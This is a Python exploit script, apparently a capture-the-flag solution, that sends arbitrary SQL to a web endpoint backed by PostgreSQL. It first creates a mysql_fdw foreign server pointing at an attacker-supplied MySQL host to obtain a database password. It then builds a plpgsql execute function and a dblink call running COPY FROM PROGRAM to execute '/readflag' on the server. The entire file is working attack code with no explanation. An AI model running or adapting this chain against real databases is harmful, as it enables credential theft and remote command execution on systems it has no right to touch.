import requests
import string
import random

HOST = "127.0.0.1"
MYSQL_SERVER = input('mysql_server_ip=')
PORT = 8004
cnt = 0

def rnd_string(l=6):
    return "".join([random.choice(string.ascii_letters) for _ in range(l)])

def get_password():
    server = rnd_string()
    foreign_table = rnd_string()
    do(f"CREATE SERVER { server } FOREIGN DATA WRAPPER mysql_fdw OPTIONS (host '{ MYSQL_SERVER }', port '3306')")
    do(f"CREATE USER MAPPING FOR realuser SERVER { server } OPTIONS (username 'a', password 'b')")
    do(f"CREATE FOREIGN TABLE { foreign_table }(t int, n text) SERVER { server } OPTIONS (dbname 'db', table_name 'w')")
    do(f"SELECT * FROM { foreign_table };")
    do(f"DROP SERVER { server } CASCADE;")

def do(sql_line):
    global cnt
    res = requests.get(f"http://{ HOST }:{ PORT }/?sql={ sql_line }")
    print(f"{ cnt }: { res.text }")
    print(f"Length { len(sql_line) }")
    print(f"sql_line { sql_line }")
    cnt += 1


def get_flag(password):
    eval_table = rnd_string()
    eval_func = rnd_string() 
    cmd_table = rnd_string()

    do(f"DROP TABLE IF EXISTS { eval_table }")
    do(f"DROP FUNCTION IF EXISTS { eval_func }")
    do(f"DROP TABLE IF EXISTS { cmd_table };")

    do(f"CREATE TABLE { eval_table } (t TEXT)")
    do(f"CREATE FUNCTION { eval_func }(h TEXT, out f TEXT) AS $$ BEGIN execute h INTO f; END $$ LANGUAGE plpgsql")
    do(f"CREATE TABLE { cmd_table }(dm_output text);")

    part1 = f"SELECT * FROM dblink (''host=127.0.0.1 dbname=postgres "
    part2 = f"user=postgres password={ password }'', ''COPY { cmd_table } "
    part3 = f"FROM PROGRAM ''''/readflag'''';'') AS b (a text);"
    do(f"INSERT INTO { eval_table } VALUES('{ part1 }')")
    do(f"INSERT INTO { eval_table } VALUES('{ part2 }')")
    do(f"INSERT INTO { eval_table } VALUES('{ part3 }')")

    do(f"SELECT { eval_func }(string_agg(t, '')) FROM { eval_table }")

    do(f"SELECT * FROM { cmd_table };")

    do(f"DROP TABLE { cmd_table };")
    do(f"DROP TABLE {eval_table}")
    do(f"DROP FUNCTION { eval_func }")

def main():
    get_password()
    password = input("input password: ")
    get_flag(password.strip())

if __name__ == "__main__":
    main()